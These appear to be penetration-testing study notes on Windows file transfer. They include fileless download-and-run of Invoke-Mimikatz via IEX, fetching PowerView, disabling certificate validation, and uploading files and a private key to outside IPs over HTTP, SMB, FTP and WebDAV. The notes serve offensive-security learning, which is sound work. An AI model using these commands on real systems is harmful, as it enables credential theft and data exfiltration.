---
title: "File transfers windows"
weight: 27
---
![1eb9e0b98ceab7de16b5e2bbd40c3414.png](/resources/1eb9e0b98ceab7de16b5e2bbd40c3414.png)

&nbsp;  ` BASE 64 method`

#### Pwnbox Check SSH Key MD5 Hash

Windows File Transfer Methods

```shell-session
cube111@local[/local]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

&nbsp;

&nbsp;

&nbsp;

#### Pwnbox Encode SSH Key to Base64

Windows File Transfer Methods

```shell-session
cube111@local[/local]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZ
```

We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.

```powershell-session
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUF
```

&nbsp;

#### Confirming the MD5 Hashes Match

Windows File Transfer Methods

```powershell-session
PS C:\local> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278
```

&nbsp;

`FILE DOWNLOAD SYNCHRONOUS AND ASYNCHRONOUS`

```powershell-session
PS C:\local> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\local> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\local> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\local> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

&nbsp;

#### `PowerShell DownloadString - Fileless Method`

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

Windows File Transfer Methods

```powershell-session
PS C:\local> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

&nbsp;

`IEX` also accepts pipeline input.

&nbsp;

```powershell-session
PS C:\local> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

&nbsp;

#### `PowerShell Invoke-WebRequest`

From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.

Windows File Transfer Methods

```powershell-session
PS C:\local> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

&nbsp;

more sophestocated methods

https://gist.github.com/HarmJ0y/bb48307ffa663256e239

&nbsp;

&nbsp;

#### Common Errors with PowerShell

&nbsp;

This can be bypassed using the parameter `-UseBasicParsing`.

Windows File Transfer Methods

```powershell-session
PS C:\local> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\local> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

Windows File Transfer Methods

```powershell-session
PS C:\local> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\local> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

&nbsp;

`SMB File` `Transfe`r

&nbsp;

```shell-session
cube111@local[/local]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```

#### Copy a File from the SMB Server

Windows File Transfer Methods

```cmd-session
C:\local> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

&nbsp;IF WINDOWS GIVES OUT PERMISSION DENIED TRY BELOW THINGS

#### Create the SMB Server with a Username and Password

Windows File Transfer Methods

```shell-session
cube111@local[/local]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

&nbsp;

#### Mount the SMB Server with Username and Password

Windows File Transfer Methods

```cmd-session
C:\local> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\local> copy n:\nc.exe
        1 file(s) copied.
```

&nbsp;

&nbsp;

FTP FILE TARNSFER

&nbsp;

#### Installing the FTP Server Python3 Module - pyftpdlib

Windows File Transfer Methods

```shell-session
cube111@local[/local]$ sudo pip3 install pyftpdlib
```

Then we can specify port number 21 because, by default, `pyftpdlib` uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.

#### Setting up a Python3 FTP Server

Windows File Transfer Methods

```shell-session
cube111@local[/local]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```

&nbsp;

IF Shell is not interactive

#### Create a Command File for the FTP Client and Download the Target File

Windows File Transfer Methods

```cmd-session
C:\local> echo open 192.168.49.128 > ftpcommand.txt
C:\local> echo USER anonymous >> ftpcommand.txt
C:\local> echo binary >> ftpcommand.txt
C:\local> echo GET file.txt >> ftpcommand.txt
C:\local> echo bye >> ftpcommand.txt
C:\local> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\local>more file.txt
This is a test file
```

&nbsp;

&nbsp;

&nbsp;

\*\*\*\*\*\*\*\*\*\*\*\*FILE  uploads\*\*\*\*\*\*\*\*\*\*\*

```powershell-session
PS C:\local> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\local> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

&nbsp;

```shell-session
cube111@local[/local]$ md5sum hosts 

3688374325b992def12793500307566d  hosts
```

&nbsp;

&nbsp;if error

$b64 = \[System.Convert\]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -AsByteStream))

powershell file uploads

server :

Windows File Transfer Methods

```shell-session
cube111@local[/local]$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadse
```

&nbsp;

```shell-session
cube111@local[/local]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

&nbsp;

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)

```powershell-session
PS C:\local> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\local> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

&nbsp;

 cube    \\OneDrive\\Desktop\\Desktop   6m 29.251s   4:34 PM     
 ⚡shaik ❯❯ invoke-fileupload

cmdlet Invoke-FileUpload at command pipeline position 1  
Supply values for the following parameters:  
File: .\\myVm_key.pem  
Uri: http://20.42.93.253:2121/upload

\[+\] File Uploaded: C:\\Users\\shaik\\OneDrive\\Desktop\\Desktop\\myVm_key.pem  
\[+\] FileHash: 25F2CBF078A553BF8508CACBF1B86CEF

&nbsp;

netcat base64 file upload using invoke-webrequest

```powershell-session
PS C:\local> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\local> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

$b64 = \[System.Convert\]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -AsByteStream))

&nbsp;

uploads SMB using webdav smb over http

&nbsp;

```shell-session
cube111@local[/local]$ sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```

&nbsp;

```shell-session
cube111@local[/local]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```

&nbsp;

&nbsp;

&nbsp;cinnectt to shares

```cmd-session
C:\local> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\local> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

&nbsp;

&nbsp;

ftp file uploads

```shell-session
cube111@local[/local]$ sudo python3 -m pyftpdlib --port 21 --write
```

&nbsp;

```powershell-session
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

&nbsp;

```cmd-session
C:\local> echo open 192.168.49.128 > ftpcommand.txt
C:\local> echo USER anonymous >> ftpcommand.txt
C:\local> echo binary >> ftpcommand.txt
C:\local> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\local> echo bye >> ftpcommand.txt
C:\local> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

&nbsp;

&nbsp;

## File Encryption on Windows

&nbsp;[https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions\\Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)

#### Invoke-AESEncryption.ps1

&nbsp;

```powershell-session
PS C:\local> Import-Module .\Invoke-AESEncryption.ps1
```

&nbsp;

```powershell-session
PS C:\local> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\local\scan-results.txt.aes
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;